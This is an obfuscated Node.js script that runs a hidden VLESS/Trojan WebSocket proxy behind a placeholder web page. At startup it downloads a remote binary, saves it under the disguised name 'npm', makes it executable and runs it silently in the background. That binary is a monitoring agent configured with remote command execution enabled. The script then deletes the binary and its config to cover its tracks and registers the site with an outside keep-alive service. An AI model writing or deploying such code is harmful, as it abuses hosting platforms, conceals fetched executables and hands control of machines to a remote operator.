const _0x374aa9=_0x4a54;(function(_0x40903b,_0xd74e21){const _0x30bd4b=_0x4a54,_0x26defd=_0x40903b();while(!![]){try{const _0x4df461=parseInt(_0x30bd4b(0x106))/0x1*(parseInt(_0x30bd4b(0x179))/0x2)+parseInt(_0x30bd4b(0x142))/0x3+-parseInt(_0x30bd4b(0x13a))/0x4*(parseInt(_0x30bd4b(0x11e))/0x5)+parseInt(_0x30bd4b(0x114))/0x6+-parseInt(_0x30bd4b(0x171))/0x7+parseInt(_0x30bd4b(0x13b))/0x8*(parseInt(_0x30bd4b(0x11f))/0x9)+parseInt(_0x30bd4b(0x16b))/0xa*(-parseInt(_0x30bd4b(0x16c))/0xb);if(_0x4df461===_0xd74e21)break;else _0x26defd['push'](_0x26defd['shift']());}catch(_0x3474f6){_0x26defd['push'](_0x26defd['shift']());}}}(_0x24d1,0xcea5a));const os=require('os'),http=require(_0x374aa9(0x141)),fs=require('fs'),axios=require(_0x374aa9(0x10a)),net=require('net'),path=require(_0x374aa9(0x14d)),crypto=require(_0x374aa9(0x11c)),{Buffer}=require(_0x374aa9(0x120)),{exec,execSync}=require(_0x374aa9(0x12a)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x374aa9(0x14a)][_0x374aa9(0x119)]||_0x374aa9(0x154),NEZHA_SERVER=process[_0x374aa9(0x14a)][_0x374aa9(0x113)]||'',NEZHA_PORT=process[_0x374aa9(0x14a)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x374aa9(0x14a)][_0x374aa9(0x177)]||'',DOMAIN=process[_0x374aa9(0x14a)]['DOMAIN']||_0x374aa9(0x145),AUTO_ACCESS=process['env'][_0x374aa9(0x121)]||!![],WSPATH=process['env']['WSPATH']||UUID[_0x374aa9(0x166)](0x0,0x8),SUB_PATH=process[_0x374aa9(0x14a)]['SUB_PATH']||_0x374aa9(0x144),NAME=process[_0x374aa9(0x14a)][_0x374aa9(0x12b)]||'Hug',PORT=process[_0x374aa9(0x14a)][_0x374aa9(0x10b)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x3b405b=_0x374aa9;try{const _0x580c43=await axios[_0x3b405b(0x126)](_0x3b405b(0x100)),_0x4df036=_0x580c43[_0x3b405b(0x164)];ISP=(_0x4df036['country']+'-'+_0x4df036['asOrganization'])[_0x3b405b(0x104)](/ /g,'_');}catch(_0x235be4){ISP='Unknown';}};GetISP();const httpServer=http[_0x374aa9(0x11a)]((_0x400d89,_0x1f76bd)=>{const _0x55046b=_0x374aa9;if(_0x400d89[_0x55046b(0x12f)]==='/'){const _0x3daa52=path[_0x55046b(0x140)](__dirname,_0x55046b(0x169));fs['readFile'](_0x3daa52,_0x55046b(0x148),(_0x332341,_0x3ed676)=>{const _0x4f0998=_0x55046b;if(_0x332341){_0x1f76bd[_0x4f0998(0x14e)](0xc8,{'Content-Type':'text/html'}),_0x1f76bd[_0x4f0998(0x153)](_0x4f0998(0x101));return;}_0x1f76bd['writeHead'](0xc8,{'Content-Type':_0x4f0998(0x161)}),_0x1f76bd['end'](_0x3ed676);});return;}else{if(_0x400d89[_0x55046b(0x12f)]==='/'+SUB_PATH){const _0x2ea39f=_0x55046b(0x150)+UUID+'@'+DOMAIN+_0x55046b(0x135)+DOMAIN+'&fp=chrome&type=ws&host='+DOMAIN+_0x55046b(0x15a)+WSPATH+'#'+NAME+'-'+ISP,_0xd5b033=_0x55046b(0x172)+UUID+'@'+DOMAIN+_0x55046b(0x10d)+DOMAIN+_0x55046b(0x10f)+DOMAIN+_0x55046b(0x15a)+WSPATH+'#'+NAME+'-'+ISP,_0x3d6f47=_0x2ea39f+'\x0a'+_0xd5b033,_0x41dfb2=Buffer[_0x55046b(0x137)](_0x3d6f47)[_0x55046b(0x146)](_0x55046b(0x10e));_0x1f76bd[_0x55046b(0x14e)](0xc8,{'Content-Type':_0x55046b(0x117)}),_0x1f76bd['end'](_0x41dfb2+'\x0a');}else _0x1f76bd[_0x55046b(0x14e)](0x194,{'Content-Type':_0x55046b(0x117)}),_0x1f76bd['end'](_0x55046b(0x15e));}}),wss=new WebSocket[(_0x374aa9(0x16e))]({'server':httpServer}),uuid=UUID[_0x374aa9(0x104)](/-/g,''),DNS_SERVERS=[_0x374aa9(0x15c),_0x374aa9(0x110)];function resolveHost(_0x3e1975){return new Promise((_0x5a9725,_0x138ce2)=>{const _0x1fc307=_0x4a54;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x1fc307(0x175)](_0x3e1975)){_0x5a9725(_0x3e1975);return;}let _0x3fcc7c=0x0;function _0x1bfaac(){const _0x123a1f=_0x1fc307;if(_0x3fcc7c>=DNS_SERVERS[_0x123a1f(0x14b)]){_0x138ce2(new Error(_0x123a1f(0x12e)+_0x3e1975+_0x123a1f(0x129)));return;}const _0x302965=DNS_SERVERS[_0x3fcc7c];_0x3fcc7c++;const _0x1d45af='https://dns.google/resolve?name='+encodeURIComponent(_0x3e1975)+_0x123a1f(0x178);axios[_0x123a1f(0x126)](_0x1d45af,{'timeout':0x1388,'headers':{'Accept':_0x123a1f(0x16d)}})[_0x123a1f(0x130)](_0xe8f2bc=>{const _0x11a99e=_0x123a1f,_0x19cb5d=_0xe8f2bc[_0x11a99e(0x164)];if(_0x19cb5d[_0x11a99e(0x116)]===0x0&&_0x19cb5d['Answer']&&_0x19cb5d[_0x11a99e(0x109)]['length']>0x0){const _0x5c29d8=_0x19cb5d[_0x11a99e(0x109)][_0x11a99e(0x163)](_0x5af28c=>_0x5af28c[_0x11a99e(0x162)]===0x1);if(_0x5c29d8){_0x5a9725(_0x5c29d8[_0x11a99e(0x164)]);return;}}_0x1bfaac();})[_0x123a1f(0x11b)](_0x45929e=>{_0x1bfaac();});}_0x1bfaac();});}function handleVlessConnection(_0x218118,_0x55afd3){const _0x391197=_0x374aa9,[_0x4950ba]=_0x55afd3,_0x5770af=_0x55afd3[_0x391197(0x166)](0x1,0x11);if(!_0x5770af[_0x391197(0x160)]((_0xae0e1,_0x4cc4b2)=>_0xae0e1==parseInt(uuid[_0x391197(0x156)](_0x4cc4b2*0x2,0x2),0x10)))return![];let _0x2fd5ea=_0x55afd3['slice'](0x11,0x12)['readUInt8']()+0x13;const _0xd73836=_0x55afd3[_0x391197(0x166)](_0x2fd5ea,_0x2fd5ea+=0x2)[_0x391197(0x102)](0x0),_0x46cef2=_0x55afd3[_0x391197(0x166)](_0x2fd5ea,_0x2fd5ea+=0x1)[_0x391197(0x168)](),_0x5444d3=_0x46cef2==0x1?_0x55afd3[_0x391197(0x166)](_0x2fd5ea,_0x2fd5ea+=0x4)[_0x391197(0x140)]('.'):_0x46cef2==0x2?new TextDecoder()[_0x391197(0x173)](_0x55afd3['slice'](_0x2fd5ea+0x1,_0x2fd5ea+=0x1+_0x55afd3['slice'](_0x2fd5ea,_0x2fd5ea+0x1)[_0x391197(0x168)]())):_0x46cef2==0x3?_0x55afd3['slice'](_0x2fd5ea,_0x2fd5ea+=0x10)[_0x391197(0x151)]((_0x12c71a,_0x546226,_0x58b339,_0xc178f1)=>_0x58b339%0x2?_0x12c71a[_0x391197(0x107)](_0xc178f1[_0x391197(0x166)](_0x58b339-0x1,_0x58b339+0x1)):_0x12c71a,[])[_0x391197(0x108)](_0x43099c=>_0x43099c[_0x391197(0x102)](0x0)[_0x391197(0x146)](0x10))[_0x391197(0x140)](':'):'';_0x218118[_0x391197(0x14f)](new Uint8Array([_0x4950ba,0x0]));const _0xb6fa42=createWebSocketStream(_0x218118);return resolveHost(_0x5444d3)['then'](_0x2aa289=>{const _0x32f5f1=_0x391197;net['connect']({'host':_0x2aa289,'port':_0xd73836},function(){const _0x111a15=_0x4a54;this['write'](_0x55afd3[_0x111a15(0x166)](_0x2fd5ea)),_0xb6fa42['on'](_0x111a15(0x152),()=>{})['pipe'](this)['on'](_0x111a15(0x152),()=>{})[_0x111a15(0x134)](_0xb6fa42);})['on'](_0x32f5f1(0x152),()=>{});})[_0x391197(0x11b)](_0x15bdc6=>{const _0x84241b=_0x391197;net[_0x84241b(0x149)]({'host':_0x5444d3,'port':_0xd73836},function(){const _0x4be2b3=_0x84241b;this[_0x4be2b3(0x139)](_0x55afd3[_0x4be2b3(0x166)](_0x2fd5ea)),_0xb6fa42['on'](_0x4be2b3(0x152),()=>{})[_0x4be2b3(0x134)](this)['on'](_0x4be2b3(0x152),()=>{})['pipe'](_0xb6fa42);})['on'](_0x84241b(0x152),()=>{});}),!![];}function handleTrojanConnection(_0x5dca71,_0x2edd7e){const _0x58abd0=_0x374aa9;try{if(_0x2edd7e[_0x58abd0(0x14b)]<0x3a)return![];const _0x1b0b37=_0x2edd7e['slice'](0x0,0x38)[_0x58abd0(0x146)](),_0x325516=[UUID];let _0xcdb2cd=null;for(const _0x1bbd55 of _0x325516){const _0x16c312=crypto[_0x58abd0(0x127)]('sha224')[_0x58abd0(0x12c)](_0x1bbd55)[_0x58abd0(0x174)](_0x58abd0(0x147));if(_0x16c312===_0x1b0b37){_0xcdb2cd=_0x1bbd55;break;}}if(!_0xcdb2cd)return![];let _0x5497d7=0x38;_0x2edd7e[_0x5497d7]===0xd&&_0x2edd7e[_0x5497d7+0x1]===0xa&&(_0x5497d7+=0x2);const _0xd6522a=_0x2edd7e[_0x5497d7];if(_0xd6522a!==0x1)return![];_0x5497d7+=0x1;const _0x4bfe43=_0x2edd7e[_0x5497d7];_0x5497d7+=0x1;let _0x4e44de,_0x478553;if(_0x4bfe43===0x1)_0x4e44de=_0x2edd7e[_0x58abd0(0x166)](_0x5497d7,_0x5497d7+0x4)['join']('.'),_0x5497d7+=0x4;else{if(_0x4bfe43===0x3){const _0x347fd8=_0x2edd7e[_0x5497d7];_0x5497d7+=0x1,_0x4e44de=_0x2edd7e[_0x58abd0(0x166)](_0x5497d7,_0x5497d7+_0x347fd8)[_0x58abd0(0x146)](),_0x5497d7+=_0x347fd8;}else{if(_0x4bfe43===0x4)_0x4e44de=_0x2edd7e[_0x58abd0(0x166)](_0x5497d7,_0x5497d7+0x10)[_0x58abd0(0x151)]((_0x59e107,_0x4b5d94,_0x59e611,_0x6ba36b)=>_0x59e611%0x2?_0x59e107[_0x58abd0(0x107)](_0x6ba36b[_0x58abd0(0x166)](_0x59e611-0x1,_0x59e611+0x1)):_0x59e107,[])[_0x58abd0(0x108)](_0x590890=>_0x590890[_0x58abd0(0x102)](0x0)[_0x58abd0(0x146)](0x10))[_0x58abd0(0x140)](':'),_0x5497d7+=0x10;else return![];}}_0x478553=_0x2edd7e[_0x58abd0(0x102)](_0x5497d7),_0x5497d7+=0x2;_0x5497d7<_0x2edd7e[_0x58abd0(0x14b)]&&_0x2edd7e[_0x5497d7]===0xd&&_0x2edd7e[_0x5497d7+0x1]===0xa&&(_0x5497d7+=0x2);const _0x4985c2=createWebSocketStream(_0x5dca71);return resolveHost(_0x4e44de)['then'](_0xd59d1a=>{const _0x44015a=_0x58abd0;net[_0x44015a(0x149)]({'host':_0xd59d1a,'port':_0x478553},function(){const _0x275f82=_0x44015a;_0x5497d7<_0x2edd7e[_0x275f82(0x14b)]&&this[_0x275f82(0x139)](_0x2edd7e[_0x275f82(0x166)](_0x5497d7)),_0x4985c2['on'](_0x275f82(0x152),()=>{})[_0x275f82(0x134)](this)['on'](_0x275f82(0x152),()=>{})['pipe'](_0x4985c2);})['on']('error',()=>{});})[_0x58abd0(0x11b)](_0x5eaa86=>{const _0x36da55=_0x58abd0;net[_0x36da55(0x149)]({'host':_0x4e44de,'port':_0x478553},function(){const _0x49f782=_0x36da55;_0x5497d7<_0x2edd7e['length']&&this[_0x49f782(0x139)](_0x2edd7e[_0x49f782(0x166)](_0x5497d7)),_0x4985c2['on'](_0x49f782(0x152),()=>{})[_0x49f782(0x134)](this)['on']('error',()=>{})[_0x49f782(0x134)](_0x4985c2);})['on'](_0x36da55(0x152),()=>{});}),!![];}catch(_0x29b5a2){return![];}}function _0x24d1(){const _0x4d8872=['http','2562660ccdFTB','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','vpn','hugspce.edisonhu.de5.net','toString','hex','utf8','connect','env','length','once','path','writeHead','send','vless://','reduce','error','end','715abf30-2577-8d99-6d76-8d60cea59ab5','chmod\x20+x\x20npm','substr','pop','npm\x20running\x20error:','2053','&path=%2F','close','8.8.4.4','npm\x20download\x20successfully','Not\x20Found\x0a','writeFileSync','every','text/html','type','find','data','https://amd64.ssss.nyc.mn/agent','slice','log','readUInt8','index.html','split','109020lYBEdC','1826EusZHs','application/dns-json','Server','https://oooo.serv00.net/add-url','npm\x20is\x20already\x20running,\x20skip\x20running...','1982169yFRRym','trojan://','decode','digest','test','listen','NEZHA_KEY','&type=A','215672BBsOtg','2096','https://speed.cloudflare.com/meta','Hello\x20world!','readUInt16BE','8443','replace','client_secret:\x20','7NmkIrr','concat','map','Answer','axios','PORT','createWriteStream',':443?security=tls&sni=','base64','&fp=chrome&type=ws&host=','1.1.1.1','npm','arch','NEZHA_SERVER','2781900aBCKOb','2083','Status','text/plain','application/json','UUID','createServer','catch','crypto','aarch64','9670GAOlod','9mZfBjm','buffer','AUTO_ACCESS','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','unlink','finish','--tls','get','createHash','post','\x20with\x20all\x20DNS\x20servers','child_process','NAME','update','includes','Failed\x20to\x20resolve\x20','url','then','Server\x20is\x20running\x20on\x20port\x20','utf-8','config.yaml','pipe',':443?encryption=none&security=tls&sni=','https://arm64.ssss.nyc.mn/agent','from','true','write','416qfwzFh','8541912SaZkjO','/bin/bash','https://arm64.ssss.nyc.mn/v1','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','join'];_0x24d1=function(){return _0x4d8872;};return _0x24d1();}wss['on']('connection',(_0x4024b6,_0x2f1a4a)=>{const _0x19e77a=_0x374aa9,_0x5b2465=_0x2f1a4a['url']||'';_0x4024b6[_0x19e77a(0x14c)]('message',_0x57183e=>{const _0x4af2ee=_0x19e77a;if(_0x57183e[_0x4af2ee(0x14b)]>0x11&&_0x57183e[0x0]===0x0){const _0x1d25f3=_0x57183e[_0x4af2ee(0x166)](0x1,0x11),_0x4d694c=_0x1d25f3['every']((_0x5ba1de,_0x371794)=>_0x5ba1de==parseInt(uuid['substr'](_0x371794*0x2,0x2),0x10));if(_0x4d694c){!handleVlessConnection(_0x4024b6,_0x57183e)&&_0x4024b6[_0x4af2ee(0x15b)]();return;}}!handleTrojanConnection(_0x4024b6,_0x57183e)&&_0x4024b6[_0x4af2ee(0x15b)]();})['on'](_0x19e77a(0x152),()=>{});});const getDownloadUrl=()=>{const _0x4cc7a4=_0x374aa9,_0x100daa=os[_0x4cc7a4(0x112)]();return _0x100daa==='arm'||_0x100daa==='arm64'||_0x100daa===_0x4cc7a4(0x11d)?!NEZHA_PORT?_0x4cc7a4(0x13d):_0x4cc7a4(0x136):!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':_0x4cc7a4(0x165);},downloadFile=async()=>{const _0x2c081e=_0x374aa9;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x4d170c=getDownloadUrl(),_0x45d787=await axios({'method':_0x2c081e(0x126),'url':_0x4d170c,'responseType':'stream'}),_0x57fdf6=fs[_0x2c081e(0x10c)](_0x2c081e(0x111));return _0x45d787[_0x2c081e(0x164)]['pipe'](_0x57fdf6),new Promise((_0x29658b,_0x572ef5)=>{const _0x3f0f12=_0x2c081e;_0x57fdf6['on'](_0x3f0f12(0x124),()=>{const _0x394fb1=_0x3f0f12;console[_0x394fb1(0x167)](_0x394fb1(0x15d)),exec(_0x394fb1(0x155),_0x53d884=>{if(_0x53d884)_0x572ef5(_0x53d884);_0x29658b();});}),_0x57fdf6['on'](_0x3f0f12(0x152),_0x572ef5);});}catch(_0x5e40ca){throw _0x5e40ca;}},runnz=async()=>{const _0x60ed52=_0x374aa9;try{const _0x5c0e64=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':_0x60ed52(0x132)});if(_0x5c0e64['trim']()!==''){console[_0x60ed52(0x167)](_0x60ed52(0x170));return;}}catch(_0x545c8b){}await downloadFile();let _0xec022c='',_0x3f33c1=['443',_0x60ed52(0x103),_0x60ed52(0xff),'2087',_0x60ed52(0x115),_0x60ed52(0x159)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x1d9995=_0x3f33c1[_0x60ed52(0x12d)](NEZHA_PORT)?_0x60ed52(0x125):'';_0xec022c='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x1d9995+_0x60ed52(0x143);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x1d521d=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x60ed52(0x16a)](':')[_0x60ed52(0x157)]():'',_0x51b5d5=_0x3f33c1[_0x60ed52(0x12d)](_0x1d521d)?_0x60ed52(0x138):'false',_0x344615=_0x60ed52(0x105)+NEZHA_KEY+_0x60ed52(0x13e)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x51b5d5+_0x60ed52(0x122)+UUID;fs[_0x60ed52(0x15f)](_0x60ed52(0x133),_0x344615);}_0xec022c='setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else{console[_0x60ed52(0x167)](_0x60ed52(0x13f));return;}}try{exec(_0xec022c,{'shell':_0x60ed52(0x13c)},_0x109bdc=>{const _0x11e01f=_0x60ed52;if(_0x109bdc)console[_0x11e01f(0x152)](_0x11e01f(0x158),_0x109bdc);else console[_0x11e01f(0x167)]('npm\x20is\x20running');});}catch(_0x16763e){console[_0x60ed52(0x152)]('error:\x20'+_0x16763e);}};function _0x4a54(_0x426dec,_0x3de78c){_0x426dec=_0x426dec-0xff;const _0x24d19b=_0x24d1();let _0x4a547f=_0x24d19b[_0x426dec];return _0x4a547f;}async function addAccessTask(){const _0x20ddf2=_0x374aa9;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x24da63='https://'+DOMAIN;try{const _0x711c8f=await axios[_0x20ddf2(0x128)](_0x20ddf2(0x16f),{'url':_0x24da63},{'headers':{'Content-Type':_0x20ddf2(0x118)}});console['log']('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x16a4e7){}}const delFiles=()=>{const _0x10bdda=_0x374aa9;fs['unlink'](_0x10bdda(0x111),()=>{}),fs[_0x10bdda(0x123)](_0x10bdda(0x133),()=>{});};httpServer[_0x374aa9(0x176)](PORT,()=>{const _0x1af36d=_0x374aa9;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x1af36d(0x167)](_0x1af36d(0x131)+PORT);});